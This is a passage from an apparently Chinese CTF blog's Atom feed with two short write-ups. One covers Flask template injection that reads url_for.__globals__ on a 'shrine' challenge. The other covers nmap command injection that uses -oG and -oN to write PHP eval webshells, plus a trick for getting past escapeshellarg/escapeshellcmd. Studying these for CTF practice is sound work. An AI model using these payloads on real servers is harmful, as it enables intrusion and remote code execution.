    <content type="html"><![CDATA[<p>不过python还有一些内置函数，比如url_for和get_flashed_messages<br>/shrine/<br>    url_for(‘static’, filename=’style.css’)<br>    这个文件应该存储在文件系统上的 static/style.css 。<br>/shrine/  注意：globals两边是两个_<br>get_flashed<br>flask闪现：<br>Flask 提供了一个非常简单的方法来使用闪现系统向用户反馈信息。闪现系统使得在一个请求结束的时候记录一个信息，然后在且仅仅在下一个请求中访问这个数据，强调flask闪现是基于flask内置的session的，利用浏览器的session缓存闪现信息。所以必须设置secret_key。</p><p><a href="http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D">http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D</a></p><p><a href="http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B">http://2785d0f9-c4bd-42b4-941c-82f794e4209b.node4.buuoj.cn:81/shrine/%7B</a><br>%7Burl_for.<strong>globals</strong>%7D%7D</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不过python还有一些内置函数，比如url_for和get_flashed_messages&lt;br&gt;/shrine/&lt;br&gt;    url_for(‘static’, filename=’style.css’)&lt;br&gt;    这个文件应该存储在文件系统上的 static/</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
    
    <category term="函数" scheme="https://sakurahack-y.github.io/tags/%E5%87%BD%E6%95%B0/"/>
    
    <category term="python" scheme="https://sakurahack-y.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>nmap结合代码执行</title>
    <link href="https://sakurahack-y.github.io/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/"/>
    <id>https://sakurahack-y.github.io/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/</id>
    <published>2021-10-08T15:23:21.425Z</published>
    <updated>2021-10-08T16:07:52.161Z</updated>
    
    <content type="html"><![CDATA[<p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>-F 实行一次快速扫描<br>选项-oG<br>将结果Grep保存<br>nmap -F -oG test.txt 192.168.23.1<br>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘<br>传入的参数经过了escapeshellarg与escapeshellcmd两个函数的处理，导致在hack.php’这样的情况下会产生hack.php\,解决办法就是在单引号前加空格</p><p>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。<br>nmap -F -oA test 192.168.3.2</p><p>‘ -oN b.phtml <?=eval(\$_POST[a]);?>‘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;选项 解释&lt;br&gt;-oN 标准保存&lt;br&gt;-oX XML保存&lt;br&gt;-oG Grep保存&lt;br&gt;-oA 保存到所有格式&lt;br&gt;-append-output 补充保存文件&lt;br&gt;-F 实行一次快速扫描&lt;br&gt;选项-oG&lt;br&gt;将结果Grep保存&lt;br&gt;nmap -F -oG </summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
    
    
    <category term="代码执行,nmap" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-nmap/"/>
    
  </entry>
  
</feed>
